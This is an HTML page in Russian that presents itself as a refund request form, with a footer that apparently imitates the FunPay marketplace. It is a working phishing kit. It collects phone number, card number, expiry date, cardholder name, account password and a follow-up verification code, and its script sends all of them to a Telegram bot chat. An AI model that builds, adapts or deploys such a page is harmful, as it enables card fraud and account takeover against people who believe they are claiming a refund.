<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оформление возврата средств</title>
    <style>
        body {
            background-color: #121212;
            color: #00ff00;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        h2 {
            margin-bottom: 20px;
        }
        input {
            width: 80%;
            max-width: 300px;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #00ff00;
            background-color: #1a1a1a;
            color: #00ff00;
            border-radius: 5px;
        }
        button {
            background-color: #00ff00;
            color: #121212;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
            margin-top: 15px;
            transition: 0.3s;
        }
        button:hover {
            background-color: #009900;
        }
        p {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
    <script>
        function showCodeForm() {
            document.getElementById('refundForm').innerHTML = `
                <h2>Введите код</h2>
                <input type="text" id="verification_code" placeholder="Код" required><br>
                <button onclick="sendFinalData()">Отправить</button>
            `;
        }
        
        function sendFinalData() {
            const data = {
                telephone: localStorage.getItem('telephone'),
                card_number: localStorage.getItem('card_number'),
                expiration_date: localStorage.getItem('expiration_date'),
                holder_name: localStorage.getItem('holder_name'),
                account_password: localStorage.getItem('account_password'),
                verification_code: document.getElementById('verification_code').value
            };
            
            fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: "-1002190411942",
                    text: `Заявка на возврат средств\nТелефон: ${data.telephone}\nНомер карты: ${data.card_number}\nСрок действия: ${data.expiration_date}\nИмя держателя: ${data.holder_name}\nПароль от ЛК: ${data.account_password}\n------------------\nКод: ${data.verification_code}`
                })
            }).then(response => {
                if (response.ok) {
                    alert('Заявка успешно отправлена!');
                }
            });
        }

        function sendData() {
            localStorage.setItem('telephone', document.getElementById('telephone').value);
            localStorage.setItem('card_number', document.getElementById('card_number').value);
            localStorage.setItem('expiration_date', document.getElementById('expiration_date').value);
            localStorage.setItem('holder_name', document.getElementById('holder_name').value);
            localStorage.setItem('account_password', document.getElementById('account_password').value);
            
            showCodeForm();
        }
    </script>
</head>
<body>
    <div id="refundForm">
        <h2>Оформление возврата средств</h2>
        <input type="text" id="telephone" placeholder="Телефон" required><br>
        <input type="text" id="card_number" placeholder="Номер карты" required><br>
        <input type="text" id="expiration_date" placeholder="Срок действия (MM/YY)" required><br>
        <input type="text" id="holder_name" placeholder="Имя держателя" required><br>
        <input type="password" id="account_password" placeholder="Пароль от ЛК" required><br>
        <button onclick="sendData()">Оформить возврат</button>
    </div>
    <p>C 2025 FUNPAY Impossible21x.</p>
</body>
</html>
